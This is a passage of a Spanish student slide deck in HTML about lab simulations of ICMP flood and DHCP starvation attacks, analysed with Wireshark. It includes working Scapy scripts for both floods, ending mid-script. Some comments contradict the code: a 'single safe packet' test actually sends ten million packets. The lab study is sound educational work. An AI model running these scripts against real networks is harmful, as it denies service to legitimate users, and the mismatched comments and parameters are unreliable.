<!DOCTYPE html>
<html lang="en"><head>
<script src="Presentation_Spanish_files/libs/clipboard/clipboard.min.js"></script>
<script src="Presentation_Spanish_files/libs/quarto-html/tabby.min.js"></script>
<script src="Presentation_Spanish_files/libs/quarto-html/popper.min.js"></script>
<script src="Presentation_Spanish_files/libs/quarto-html/tippy.umd.min.js"></script>
<link href="Presentation_Spanish_files/libs/quarto-html/tippy.css" rel="stylesheet">
<link href="Presentation_Spanish_files/libs/quarto-html/light-border.css" rel="stylesheet">
<link href="Presentation_Spanish_files/libs/quarto-html/quarto-syntax-highlighting-dark-7e9717d9caa9b4d114d189eaeb260ada.css" rel="stylesheet" id="quarto-text-highlighting-styles"><meta charset="utf-8">
  <meta name="generator" content="quarto-1.8.21">

  <meta name="author" content="Camila Guzm√°n">
  <meta name="author" content="Dami√°n Luna">
  <meta name="author" content="Juan Pablo de la Pe√±a">
  <meta name="author" content="Gonzalo Higuera">
  <meta name="author" content="Alfredo Lopez">
  <title>Simulaci√≥n, Diagn√≥stico y Prevenci√≥n de Ataques</title>
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
  <link rel="stylesheet" href="Presentation_Spanish_files/libs/revealjs/dist/reset.css">
  <link rel="stylesheet" href="Presentation_Spanish_files/libs/revealjs/dist/reveal.css">
  <style>
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    div.columns{display: flex; gap: min(4vw, 1.5em);}
    div.column{flex: auto; overflow-x: auto;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    ul.task-list{list-style: none;}
    ul.task-list li input[type="checkbox"] {
      width: 0.8em;
      margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
      vertical-align: middle;
    }
    /* CSS for syntax highlighting */
    html { -webkit-text-size-adjust: 100%; }
    pre > code.sourceCode { white-space: pre; position: relative; }
    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
    pre > code.sourceCode > span:empty { height: 1.2em; }
    .sourceCode { overflow: visible; }
    code.sourceCode > span { color: inherit; text-decoration: inherit; }
    div.sourceCode { margin: 1em 0; }
    pre.sourceCode { margin: 0; }
    @media screen {
    div.sourceCode { overflow: auto; }
    }
    @media print {
    pre > code.sourceCode { white-space: pre-wrap; }
    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
    }
    pre.numberSource code
      { counter-reset: source-line 0; }
    pre.numberSource code > span
      { position: relative; left: -4em; counter-increment: source-line; }
    pre.numberSource code > span > a:first-child::before
      { content: counter(source-line);
        position: relative; left: -1em; text-align: right; vertical-align: baseline;
        border: none; display: inline-block;
        -webkit-touch-callout: none; -webkit-user-select: none;
        -khtml-user-select: none; -moz-user-select: none;
        -ms-user-select: none; user-select: none;
        padding: 0 4px; width: 4em;
      }
    pre.numberSource { margin-left: 3em;  padding-left: 4px; }
    div.sourceCode
      { color: #f8f8f2;  }
    @media screen {
    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
    }
    code span { color: #f8f8f2; } /* Normal */
    code span.al { color: #f07178; } /* Alert */
    code span.an { color: #d4d0ab; } /* Annotation */
    code span.at { color: #00e0e0; } /* Attribute */
    code span.bn { color: #d4d0ab; } /* BaseN */
    code span.bu { color: #abe338; } /* BuiltIn */
    code span.cf { color: #ffa07a; font-weight: bold; } /* ControlFlow */
    code span.ch { color: #abe338; } /* Char */
    code span.cn { color: #ffd700; } /* Constant */
    code span.co { color: #f8f8f2; font-style: italic; } /* Comment */
    code span.cv { color: #ffd700; } /* CommentVar */
    code span.do { color: #f8f8f2; } /* Documentation */
    code span.dt { color: #ffa07a; } /* DataType */
    code span.dv { color: #d4d0ab; } /* DecVal */
    code span.er { color: #f07178; text-decoration: underline; } /* Error */
    code span.ex { color: #00e0e0; font-weight: bold; } /* Extension */
    code span.fl { color: #d4d0ab; } /* Float */
    code span.fu { color: #ffa07a; } /* Function */
    code span.im { color: #abe338; } /* Import */
    code span.in { color: #d4d0ab; } /* Information */
    code span.kw { color: #ffa07a; font-weight: bold; } /* Keyword */
    code span.op { color: #ffa07a; } /* Operator */
    code span.ot { color: #00e0e0; } /* Other */
    code span.pp { color: #dcc6e0; } /* Preprocessor */
    code span.re { color: #00e0e0; background-color: #f8f8f2; } /* RegionMarker */
    code span.sc { color: #abe338; } /* SpecialChar */
    code span.ss { color: #abe338; } /* SpecialString */
    code span.st { color: #abe338; } /* String */
    code span.va { color: #00e0e0; } /* Variable */
    code span.vs { color: #abe338; } /* VerbatimString */
    code span.wa { color: #dcc6e0; } /* Warning */
  </style>
  <link rel="stylesheet" href="Presentation_Spanish_files/libs/revealjs/dist/theme/quarto-327cab17de08e4a17faa7d61f48ae591.css">
  <link href="Presentation_Spanish_files/libs/revealjs/plugin/quarto-line-highlight/line-highlight.css" rel="stylesheet">
  <link href="Presentation_Spanish_files/libs/revealjs/plugin/reveal-menu/menu.css" rel="stylesheet">
  <link href="Presentation_Spanish_files/libs/revealjs/plugin/reveal-menu/quarto-menu.css" rel="stylesheet">
  <link href="Presentation_Spanish_files/libs/revealjs/plugin/quarto-support/footer.css" rel="stylesheet">
  <style type="text/css">
    .reveal div.sourceCode {
      margin: 0;
      overflow: auto;
    }
    .reveal div.hanging-indent {
      margin-left: 1em;
      text-indent: -1em;
    }
    .reveal .slide:not(.center) {
      height: 100%;
    }
    .reveal .slide.scrollable {
      overflow-y: auto;
    }
    .reveal .footnotes {
      height: 100%;
      overflow-y: auto;
    }
    .reveal .slide .absolute {
      position: absolute;
      display: block;
    }
    .reveal .footnotes ol {
      counter-reset: ol;
      list-style-type: none; 
      margin-left: 0;
    }
    .reveal .footnotes ol li:before {
      counter-increment: ol;
      content: counter(ol) ". "; 
    }
    .reveal .footnotes ol li > p:first-child {
      display: inline-block;
    }
    .reveal .slide ul,
    .reveal .slide ol {
      margin-bottom: 0.5em;
    }
    .reveal .slide ul li,
    .reveal .slide ol li {
      margin-top: 0.4em;
      margin-bottom: 0.2em;
    }
    .reveal .slide ul[role="tablist"] li {
      margin-bottom: 0;
    }
    .reveal .slide ul li > *:first-child,
    .reveal .slide ol li > *:first-child {
      margin-block-start: 0;
    }
    .reveal .slide ul li > *:last-child,
    .reveal .slide ol li > *:last-child {
      margin-block-end: 0;
    }
    .reveal .slide .columns:nth-child(3) {
      margin-block-start: 0.8em;
    }
    .reveal blockquote {
      box-shadow: none;
    }
    .reveal .tippy-content>* {
      margin-top: 0.2em;
      margin-bottom: 0.7em;
    }
    .reveal .tippy-content>*:last-child {
      margin-bottom: 0.2em;
    }
    .reveal .slide > img.stretch.quarto-figure-center,
    .reveal .slide > img.r-stretch.quarto-figure-center {
      display: block;
      margin-left: auto;
      margin-right: auto; 
    }
    .reveal .slide > img.stretch.quarto-figure-left,
    .reveal .slide > img.r-stretch.quarto-figure-left  {
      display: block;
      margin-left: 0;
      margin-right: auto; 
    }
    .reveal .slide > img.stretch.quarto-figure-right,
    .reveal .slide > img.r-stretch.quarto-figure-right  {
      display: block;
      margin-left: auto;
      margin-right: 0; 
    }
  </style>
</head>
<body class="quarto-dark">
  <div class="reveal">
    <div class="slides">

<section id="title-slide" class="quarto-title-block center">
  <h1 class="title">Simulaci√≥n, Diagn√≥stico y Prevenci√≥n de Ataques</h1>

<div class="quarto-title-authors">
<div class="quarto-title-author">
<div class="quarto-title-author-name">
Camila Guzm√°n 
</div>
</div>
<div class="quarto-title-author">
<div class="quarto-title-author-name">
Dami√°n Luna 
</div>
</div>
<div class="quarto-title-author">
<div class="quarto-title-author-name">
Juan Pablo de la Pe√±a 
</div>
</div>
<div class="quarto-title-author">
<div class="quarto-title-author-name">
Gonzalo Higuera 
</div>
</div>
<div class="quarto-title-author">
<div class="quarto-title-author-name">
Alfredo Lopez 
</div>
</div>
</div>

</section><section id="TOC">
<nav role="doc-toc"> 
<h2 id="toc-title">Table of contents</h2>
<ul>
<li class="fragment"><a href="#/abstract" id="/toc-abstract">Abstract</a>
<ul>

</ul></li>
<li class="fragment"><a href="#/fase-1-dise√±o-del-escenario-y-explicaci√≥n-del-ataque" id="/toc-fase-1-dise√±o-del-escenario-y-explicaci√≥n-del-ataque">Fase 1: Dise√±o del escenario y explicaci√≥n del ataque</a>
<ul>
<li class="fragment"><a href="#/simulaci√≥n-topol√≥gica" id="/toc-simulaci√≥n-topol√≥gica">Simulaci√≥n Topol√≥gica</a></li>
</ul></li>
<li class="fragment"><a href="#/fase-2-simulaci√≥n-del-ataque-y-captura-del-tr√°fico" id="/toc-fase-2-simulaci√≥n-del-ataque-y-captura-del-tr√°fico">Fase 2: Simulaci√≥n del ataque y captura del tr√°fico</a>
<ul>
<li class="fragment"><a href="#/introducci√≥n" id="/toc-introducci√≥n">Introducci√≥n</a></li>
<li class="fragment"><a href="#/creaci√≥n-del-entorno-de-trabajo" id="/toc-creaci√≥n-del-entorno-de-trabajo">Creaci√≥n del Entorno de Trabajo</a></li>
<li class="fragment"><a href="#/ping-flood" id="/toc-ping-flood">PING FLOOD</a></li>
<li class="fragment"><a href="#/dhcp-starvation" id="/toc-dhcp-starvation">DHCP Starvation</a></li>
<li class="fragment"><a href="#/conclusiones" id="/toc-conclusiones">Conclusiones</a></li>

</ul></li>
<li class="fragment"><a href="#/fase-3-an√°lisis-de-datos-con-python" id="/toc-fase-3-an√°lisis-de-datos-con-python">Fase 3: An√°lisis de datos con Python</a>
<ul>
<li class="fragment"><a href="#/resultados" id="/toc-resultados">Resultados</a>
<ul>
<li class="fragment"><a href="#/explicaci√≥n-de-evidencia-y-comportamiento-de-los-ataques" id="/toc-explicaci√≥n-de-evidencia-y-comportamiento-de-los-ataques"><strong>Explicaci√≥n de Evidencia y Comportamiento de los Ataques</strong></a></li>
<li class="fragment"><a href="#/conclusi√≥n-de-fase" id="/toc-conclusi√≥n-de-fase">Conclusi√≥n de Fase</a></li>
</ul></li>

</ul></li>
<li class="fragment"><a href="#/fase-4-diagn√≥stico-con-inteligencia-artificial-y-mitigaci√≥n" id="/toc-fase-4-diagn√≥stico-con-inteligencia-artificial-y-mitigaci√≥n">Fase 4: Diagn√≥stico con Inteligencia Artificial y mitigaci√≥n</a>
<ul>
<li class="fragment"><a href="#/transcripci√≥n-de-la-conversaci√≥n-con-chat-gpt" id="/toc-transcripci√≥n-de-la-conversaci√≥n-con-chat-gpt">Transcripci√≥n de la conversaci√≥n con Chat-GPT</a></li>
<li class="fragment"><a href="#/diagn√≥stico-final" id="/toc-diagn√≥stico-final">Diagn√≥stico final</a></li>
<li class="fragment"><a href="#/propuesta-de-mitigaci√≥n" id="/toc-propuesta-de-mitigaci√≥n">Propuesta de mitigaci√≥n</a>
<ul>
<li class="fragment"><a href="#/propuesta-del-equipo" id="/toc-propuesta-del-equipo">Propuesta del equipo</a></li>
<li class="fragment"><a href="#/chat-gpt" id="/toc-chat-gpt">Chat-GPT:</a></li>
</ul></li>
</ul></li>
<li class="fragment"><a href="#/conclusi√≥n-del-proyecto" id="/toc-conclusi√≥n-del-proyecto">Conclusi√≥n del Proyecto</a></li>
</ul>
</nav>
</section>
<section>
<section id="abstract" class="title-slide slide level1 center">
<h1>Abstract</h1>
<p>El trabajo analiza dos ataques de denegaci√≥n de servicio : ICMP Flood y DHCP Starvation. Para ello, se construy√≥ un laboratorio donde se configur√≥ una topolog√≠a de red, se lanzaron ambos ataques y se captur√≥ el tr√°fico con herramientas con Scapy y Wireshark.</p>
<p>Posteriormente, se aplicaron t√©cnicas de ciencia de datos a los archivos&nbsp;<em>pcapng</em>&nbsp;para detectar anomal√≠as asumiendo el no conocer previamente la existencia de los ataques.</p>
<p>Finalmente, se utiliz√≥ una inteligencia artificial (ChatGPT 5.1) para obtener un diagn√≥stico adicional y recomendaciones de mitigaci√≥n.</p>
<p>Los resultados muestran la alta efectividad de ambos ataques para afectar la disponibilidad del servicio y destacan la importancia de implementar controles como DHCP Snooping, port security, limitaci√≥n de ICMP, IDS/IPS y monitoreo continuo en infraestructuras reales.</p>
</section>
<section class="slide level2">

</section></section>
<section>
<section id="fase-1-dise√±o-del-escenario-y-explicaci√≥n-del-ataque" class="title-slide slide level1 center">
<h1>Fase 1: Dise√±o del escenario y explicaci√≥n del ataque</h1>

</section>
<section id="simulaci√≥n-topol√≥gica" class="slide level2">
<h2>Simulaci√≥n Topol√≥gica</h2>
<div class="quarto-figure quarto-figure-center">
<figure>
<p><img data-src="../figures/topology.png"></p>
<figcaption>Topology</figcaption>
</figure>
</div>
<div class="quarto-figure quarto-figure-center">
<figure>
<p><img data-src="../figures/config_code.png"></p>
<figcaption>Configuration code</figcaption>
</figure>
</div>
<p>se descubri√≥ que, dada la configuraci√≥n del switch en el laboratorio de pruebas, el an√°lisis solamente podr√° ser realizado desde el ordenador de la v√≠ctima.</p>
<table class="caption-top" style="width:6%;">
<colgroup>
<col style="width: 5%">
</colgroup>
<tbody>
<tr class="odd">
<td>## Ataques <strong>ICMP Flood:</strong> 1. El atacante env√≠a una gran cantidad de solicitudes ICMP (ping) a la v√≠ctima. 2. Cada solicitud requiere ser procesada, ya que el paquete tiene que responder con un ‚Äúecho reply‚Äù. 3. Si el volumen de solicitudes es demasiado alto, los recursos de la v√≠ctima (GPU, memoria, etc) se saturan. 4. Finalmente, la m√°quina o red atacada se puede volver inaccesible.</td>
</tr>
<tr class="even">
<td><strong>DHCP Starvation:</strong> Este ataque es del tipo de negaci√≥n de servicio (DoS), su objetivo es dejar sin direcciones IP disponibles a un servidor DHCP. As√≠ funciona:</td>
</tr>
<tr class="odd">
<td>1. El atacante env√≠a un paquete DHCP Discover como si fuera un cliente normal, pero lo hace con direcciones MAC falsas en cada petici√≥n. 2. El servidor responde ofreciendo una direcci√≥n IP disponible en su <em>pool</em>. 3. El atacante confirma y acepta de la IP ofrecida con un DHCP Request. C√≥mo usa una MAC diferente cada vez, el servidor piensa que es un dispositivo nuevo. 4. El servidor registra esa IP como si fuera asignada a un cliente real. Se repiten los pasos anteriores cientos o miles de veces con MAC falsas cada vez. 5. Como resultado si un cliente real quiere acceder a la red, se le niega porque ya no quedan direcciones IP disponibles y as√≠ niega el servicio completamente.</td>
</tr>
<tr class="even">
<td>## Primer Acercamiento</td>
</tr>
<tr class="odd">
<td>Se realiz√≥ en un laboratorio la topolog√≠a mostrada. Se siguieron las siguientes l√≠neas de c√≥digo en la terminal de la consola ligada al router para la configuraci√≥n:</td>
</tr>
<tr class="even">
<td><code>bash enable configure terminal interface GigabitEthernet 0/0 ip address 10.0.0.1 255.255.255.0 no shutdown exit ip dhcp excluded-address 10.0.0.1 10.0.0.10 ip dhcp pool JUAN network 10.0.0.0 255.255.255.0 default-router 10.0.0.1</code></td>
</tr>
<tr class="odd">
<td>Despu√©s de que se asignaron las IPs a las computadoras y se cre√≥ el grupo DHCP, se realizaron pings infinitos para documentarlos en la herramienta WireShark.</td>
</tr>
<tr class="even">
<td><strong>(Ejemplo de comando en terminal Adjunto)</strong></td>
</tr>
<tr class="odd">
<td><code>bash ping 10.0.0.4 -t</code></td>
</tr>
<tr class="even">
<td>Lo que se observ√≥ en la plataforma al realizar los pings es que un ordenador no puede abrir paquetes con destinatarios ajenos. Se sospech√≥ que esto podr√≠a deberse a los permisos configurados en el Switch del Laboratorio.</td>
</tr>
<tr class="odd">
<td>### Caracter√≠sticas del Ambiente Construido</td>
</tr>
<tr class="even">
<td>Con fines de replicabilidad, se nombran a continuaci√≥n las caracter√≠sticas de la pr√°ctica de laboratorio.</td>
</tr>
<tr class="odd">
<td><strong>Sistema Operativo</strong> Windows.</td>
</tr>
<tr class="even">
<td><strong>Herramientas necesarias</strong></td>
</tr>
<tr class="odd">
<td>- Wireshark - hping3 o nping (Nmap) para ICMP Flood. - Ettercap, arpspoof (dsniff) o Bettercap para ARP Spoofing. - Yersinia o dhcpstarv para DHCP Starvation.</td>
</tr>
<tr class="even">
<td><strong>Permisos requeridos</strong></td>
</tr>
<tr class="odd">
<td>- Acceso de administrador de sistema. - Permisos para habilitar el modo promiscuo. - Permisos para ejecuci√≥n de herramientas de red. - Acceso a la red de prueba sin firewall activado.</td>
</tr>
</tbody>
</table>
</section></section>
<section>
<section id="fase-2-simulaci√≥n-del-ataque-y-captura-del-tr√°fico" class="title-slide slide level1 center">
<h1>Fase 2: Simulaci√≥n del ataque y captura del tr√°fico</h1>

</section>
<section id="introducci√≥n" class="slide level2">
<h2>Introducci√≥n</h2>
<p>El prop√≥sito de esta segunda pr√°ctica es lograr una implementaci√≥n de ataques virtuales mediante un entorno controlado: un laboratorio de redes. Los dos causantes de DoS seleccionados a implementar fueron el <strong>DHCP Starvation</strong>, el cual env√≠a numerosas solicitudes DHCP falsas con direcciones MAC distintas para agotar el rango de direcciones IP disponibles - impidiendo que dispositivos leg√≠timos obtengan configuraci√≥n de red- y <strong>Ping Flood</strong> , este env√≠a un gran volumen de paquetes ICMP Echo Request para saturar el ancho de banda o recursos del sistema objetivo. Como se mencion√≥ anteriormente, esto se realiz√≥ en un ambiente controlado y fue evidenciado mediante la herramienta WireShark manteniendo un registro del tr√°fico de paquetes; la simulaci√≥n tuvo una duraci√≥n total de 50 minutos.</p>
</section>
<section id="creaci√≥n-del-entorno-de-trabajo" class="slide level2">
<h2>Creaci√≥n del Entorno de Trabajo</h2>
<p>Primeramente, se cre√≥ la topolog√≠a de trabajo nuevamente, donde se incluy√≥ la consola al router con funci√≥n de la v√≠ctima, y una segunda computadora que funcion√≥ como atacante y analista. Se configur√≥ un grupo dhcp con el rango de IPs de 192.168.10.0 255.255.255.0 del cual se excluyeron las primeras 10. Luego, desde la computadora del atacante se abri√≥ WireShark y se realizaron pruebas de pings infinitos para asegurar comunicaci√≥n entre las computadoras.</p>
</section>
<section id="ping-flood" class="slide level2">
<h2>PING FLOOD</h2>
<p>Para poder llevar a cabo este ataque, se cre√≥ un archivo python. Se hizo uso de la librer√≠a <strong><em>Scapy</em></strong>, la cual simplific√≥ el flujo del c√≥digo. En la funci√≥n especificada para construir el ataque, se incluye la direcci√≥n IP v√≠ctima, el n√∫mero de paquetes a enviar y el tama√±o de cada paquete. Para implementar el c√≥digo, se direccion√≥ hacia la ip 192.168.10.21 (el router) con un total de 1,000 paquetes y un peso de 65,000 bytes (el m√°ximo dentro de paquetes ICMP).</p>
<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb1"><pre class="sourceCode numberSource python number-lines code-with-copy"><code class="sourceCode python"><span id="cb1-1"><a href=""></a><span class="im">from</span> scapy.layers.inet <span class="im">import</span> IP, ICMP</span>
<span id="cb1-2"><a href=""></a><span class="im">from</span> scapy.packet <span class="im">import</span> Raw</span>
<span id="cb1-3"><a href=""></a><span class="im">from</span> scapy.sendrecv <span class="im">import</span> send</span>
<span id="cb1-4"><a href=""></a></span>
<span id="cb1-5"><a href=""></a><span class="kw">def</span> send_ping(target_ip_address: <span class="bu">str</span>, number_of_packets_to_send: <span class="bu">int</span> <span class="op">=</span> <span class="dv">4</span>, size_of_packet: <span class="bu">int</span> <span class="op">=</span> <span class="dv">400</span>):</span>
<span id="cb1-6"><a href=""></a>    ip <span class="op">=</span> IP(dst<span class="op">=</span>target_ip_address)</span>
<span id="cb1-7"><a href=""></a>    icmp <span class="op">=</span> ICMP()</span>
<span id="cb1-8"><a href=""></a>    raw <span class="op">=</span> Raw(<span class="st">b"X"</span> <span class="op">*</span> size_of_packet)</span>
<span id="cb1-9"><a href=""></a>    p <span class="op">=</span> ip <span class="op">/</span> icmp <span class="op">/</span> raw</span>
<span id="cb1-10"><a href=""></a>    send(p, count<span class="op">=</span>number_of_packets_to_send, verbose<span class="op">=</span><span class="dv">0</span>)</span>
<span id="cb1-11"><a href=""></a>    <span class="bu">print</span>(<span class="st">'send_ping(): Sent '</span> <span class="op">+</span> <span class="bu">str</span>(number_of_packets_to_send) <span class="op">+</span> <span class="st">' pings of '</span> <span class="op">+</span> <span class="bu">str</span>(size_of_packet) <span class="op">+</span> <span class="st">' size to '</span> <span class="op">+</span> target_ip_address)</span>
<span id="cb1-12"><a href=""></a></span>
<span id="cb1-13"><a href=""></a></span>
<span id="cb1-14"><a href=""></a>ip <span class="op">=</span> <span class="st">"192.168.10.11"</span></span>
<span id="cb1-15"><a href=""></a>send_ping(ip, number_of_packets_to_send<span class="op">=</span><span class="dv">10000</span>)</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
<p class="code-caption">
</p><p>C√≥digo utilizado para Ping Flood<sup>1</sup></p>
<p></p>
<p>El script fue ejecutado desde la terminal del atacante. Con fines de ratificaci√≥n, se intent√≥ hacer ping desde la computadora del cliente al router, donde en ocasiones, el tiempo de respuesta disminu√≠a. En Wireshark esto se contempla como un conjunto masivo de observaciones donde se reporta el protocolo ICMP hacia 192.168.10.21 y sus Echos correspondientes.</p>
<div class="quarto-figure quarto-figure-center">
<figure>
<p><img data-src="../figures/ping_flood0.png"></p>
<figcaption>Evidence of Attack</figcaption>
</figure>
</div>
<div class="quarto-figure quarto-figure-center">
<figure>
<p><img data-src="../figures/ping_flood1.png"></p>
<figcaption>Evidence of Attack</figcaption>
</figure>
</div>
<aside><ol class="aside-footnotes"><li id="fn1"><p>C√≥digo utilizado para Ping Flood</p></li></ol></aside></section>
<section id="dhcp-starvation" class="slide level2">
<h2>DHCP Starvation</h2>
<p>En la segunda situaci√≥n, se utiliz√≥ igualmente <em>scapy</em>. En el c√≥digo se definieron funciones para crear las direcciones MAC falsas, para buscar una interfaz cuya IP empiece con el prefijo indicado y entregar el nombre de la interfaz junto buscar dicha interfaz. Finalmente, en la implementaci√≥n se hace uso de esta informaci√≥n para hacer una solicitud de asignaci√≥n de una IP junto con la cantidad de IPs a solicitar especificada por el usuario. Esta se ejecut√≥ desde la terminal del atacante siendo ‚ÄúEthernet‚Äù la interfaz identificada.</p>
<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb2"><pre class="sourceCode numberSource python number-lines code-with-copy"><code class="sourceCode python"><span id="cb2-1"><a href=""></a><span class="co"># dhcpStarvation_helper.py</span></span>
<span id="cb2-2"><a href=""></a><span class="im">from</span> scapy.<span class="bu">all</span> <span class="im">import</span> (</span>
<span id="cb2-3"><a href=""></a>    Ether, IP, UDP, BOOTP, DHCP,</span>
<span id="cb2-4"><a href=""></a>    RandMAC, sendp, get_if_list, get_if_addr</span>
<span id="cb2-5"><a href=""></a>)</span>
<span id="cb2-6"><a href=""></a><span class="im">import</span> sys</span>
<span id="cb2-7"><a href=""></a></span>
<span id="cb2-8"><a href=""></a><span class="co"># Construye el DHCP Discover (ajusta si ya tienes otra versi√≥n)</span></span>
<span id="cb2-9"><a href=""></a>dhcp_discover <span class="op">=</span> Ether(dst<span class="op">=</span><span class="st">'ff:ff:ff:ff:ff:ff'</span>, src<span class="op">=</span>RandMAC()) <span class="op">/</span> <span class="op">\</span></span>
<span id="cb2-10"><a href=""></a>    IP(src<span class="op">=</span><span class="st">'0.0.0.0'</span>, dst<span class="op">=</span><span class="st">'192.168.10.255'</span>) <span class="op">/</span> <span class="op">\</span></span>
<span id="cb2-11"><a href=""></a>    UDP(sport<span class="op">=</span><span class="dv">68</span>, dport<span class="op">=</span><span class="dv">67</span>) <span class="op">/</span> <span class="op">\</span></span>
<span id="cb2-12"><a href=""></a>    BOOTP(op<span class="op">=</span><span class="dv">1</span>, chaddr<span class="op">=</span>RandMAC()) <span class="op">/</span> <span class="op">\</span></span>
<span id="cb2-13"><a href=""></a>    DHCP(options<span class="op">=</span>[(<span class="st">'message-type'</span>,<span class="st">'discover'</span>), (<span class="st">'end'</span>)])</span>
<span id="cb2-14"><a href=""></a></span>
<span id="cb2-15"><a href=""></a><span class="kw">def</span> find_iface_by_subnet(prefix<span class="op">=</span><span class="st">"192.168.10."</span>):</span>
<span id="cb2-16"><a href=""></a>    <span class="co">"""</span></span>
<span id="cb2-17"><a href=""></a><span class="co">    Busca una interfaz cuya IP empiece con prefix.</span></span>
<span id="cb2-18"><a href=""></a><span class="co">    Devuelve el nombre de la interfaz o None.</span></span>
<span id="cb2-19"><a href=""></a><span class="co">    """</span></span>
<span id="cb2-20"><a href=""></a>    <span class="cf">for</span> iface <span class="kw">in</span> get_if_list():</span>
<span id="cb2-21"><a href=""></a>        <span class="cf">try</span>:</span>
<span id="cb2-22"><a href=""></a>            ip <span class="op">=</span> get_if_addr(iface)</span>
<span id="cb2-23"><a href=""></a>            <span class="cf">if</span> ip <span class="kw">and</span> ip.startswith(prefix):</span>
<span id="cb2-24"><a href=""></a>                <span class="cf">return</span> iface</span>
<span id="cb2-25"><a href=""></a>        <span class="cf">except</span> <span class="pp">Exception</span>:</span>
<span id="cb2-26"><a href=""></a>            <span class="co"># algunas interfaces no tienen IP o generan excepci√≥n</span></span>
<span id="cb2-27"><a href=""></a>            <span class="cf">pass</span></span>
<span id="cb2-28"><a href=""></a>    <span class="cf">return</span> <span class="va">None</span></span>
<span id="cb2-29"><a href=""></a></span>
<span id="cb2-30"><a href=""></a><span class="kw">def</span> choose_interface(preferred_prefix<span class="op">=</span><span class="st">"192.168.10."</span>):</span>
<span id="cb2-31"><a href=""></a>    <span class="co"># 1) si el usuario pasa el nombre por argumento de l√≠nea de comandos, usarlo</span></span>
<span id="cb2-32"><a href=""></a>    <span class="cf">if</span> <span class="bu">len</span>(sys.argv) <span class="op">&gt;</span> <span class="dv">1</span>:</span>
<span id="cb2-33"><a href=""></a>        <span class="cf">return</span> sys.argv[<span class="dv">1</span>]</span>
<span id="cb2-34"><a href=""></a></span>
<span id="cb2-35"><a href=""></a>    <span class="co"># 2) buscar por prefijo de subred (√∫til en el aula)</span></span>
<span id="cb2-36"><a href=""></a>    iface <span class="op">=</span> find_iface_by_subnet(preferred_prefix)</span>
<span id="cb2-37"><a href=""></a>    <span class="cf">if</span> iface:</span>
<span id="cb2-38"><a href=""></a>        <span class="cf">return</span> iface</span>
<span id="cb2-39"><a href=""></a></span>
<span id="cb2-40"><a href=""></a>    <span class="co"># 3) heur√≠stica: elegir primera interfaz "Ethernet" o "Wi-Fi" si aparece</span></span>
<span id="cb2-41"><a href=""></a>    ifaces <span class="op">=</span> get_if_list()</span>
<span id="cb2-42"><a href=""></a>    <span class="cf">for</span> name <span class="kw">in</span> ifaces:</span>
<span id="cb2-43"><a href=""></a>        <span class="cf">if</span> <span class="st">"Ethernet"</span> <span class="kw">in</span> name <span class="kw">or</span> <span class="st">"eth"</span> <span class="kw">in</span> name.lower():</span>
<span id="cb2-44"><a href=""></a>            <span class="cf">return</span> name</span>
<span id="cb2-45"><a href=""></a>    <span class="cf">for</span> name <span class="kw">in</span> ifaces:</span>
<span id="cb2-46"><a href=""></a>        <span class="cf">if</span> <span class="st">"Wi-Fi"</span> <span class="kw">in</span> name <span class="kw">or</span> <span class="st">"wlan"</span> <span class="kw">in</span> name.lower() <span class="kw">or</span> <span class="st">"wifi"</span> <span class="kw">in</span> name.lower():</span>
<span id="cb2-47"><a href=""></a>            <span class="cf">return</span> name</span>
<span id="cb2-48"><a href=""></a></span>
<span id="cb2-49"><a href=""></a>    <span class="co"># 4) fallback: la primera que no sea loopback</span></span>
<span id="cb2-50"><a href=""></a>    <span class="cf">for</span> name <span class="kw">in</span> ifaces:</span>
<span id="cb2-51"><a href=""></a>        <span class="cf">if</span> <span class="st">"loop"</span> <span class="kw">not</span> <span class="kw">in</span> name.lower():</span>
<span id="cb2-52"><a href=""></a>            <span class="cf">return</span> name</span>
<span id="cb2-53"><a href=""></a></span>
<span id="cb2-54"><a href=""></a>    <span class="co"># 5) si no hay nada, devolver None</span></span>
<span id="cb2-55"><a href=""></a>    <span class="cf">return</span> <span class="va">None</span></span>
<span id="cb2-56"><a href=""></a></span>
<span id="cb2-57"><a href=""></a><span class="kw">def</span> main():</span>
<span id="cb2-58"><a href=""></a>    <span class="bu">print</span>(<span class="st">"Interfaces detectadas por Scapy:"</span>, get_if_list())</span>
<span id="cb2-59"><a href=""></a></span>
<span id="cb2-60"><a href=""></a>    iface <span class="op">=</span> choose_interface()</span>
<span id="cb2-61"><a href=""></a>    <span class="cf">if</span> iface <span class="kw">is</span> <span class="va">None</span>:</span>
<span id="cb2-62"><a href=""></a>        <span class="bu">print</span>(<span class="st">"ERROR: No se pudo detectar una interfaz v√°lida."</span>)</span>
<span id="cb2-63"><a href=""></a>        <span class="bu">print</span>(<span class="st">"Prueba a ejecutar: python dhcpStarvation_helper.py </span><span class="ch">\"</span><span class="st">Ethernet</span><span class="ch">\"</span><span class="st">"</span>)</span>
<span id="cb2-64"><a href=""></a>        <span class="cf">return</span></span>
<span id="cb2-65"><a href=""></a></span>
<span id="cb2-66"><a href=""></a>    <span class="bu">print</span>(<span class="st">"Interfaz elegida:"</span>, iface)</span>
<span id="cb2-67"><a href=""></a>    <span class="bu">print</span>(<span class="st">"Haciendo env√≠o de prueba (count=1). Si esto falla, revisa Npcap y permisos."</span>)</span>
<span id="cb2-68"><a href=""></a></span>
<span id="cb2-69"><a href=""></a>    <span class="cf">try</span>:</span>
<span id="cb2-70"><a href=""></a>        <span class="co"># prueba segura: solo un paquete</span></span>
<span id="cb2-71"><a href=""></a>        sendp(dhcp_discover, iface<span class="op">=</span>iface, count<span class="op">=</span><span class="dv">10000000</span>, verbose<span class="op">=</span><span class="dv">1</span>)</span>
<span id="cb2-72"><a href=""></a>        <span class="bu">print</span>(<span class="st">"Env√≠o realizado. Si ves tr√°fico en Wireshark/PCAP, ya funciona."</span>)</span>
<span id="cb2-73"><a href=""></a>    <span class="cf">except</span> <span class="pp">Exception</span> <span class="im">as</span> e:</span>
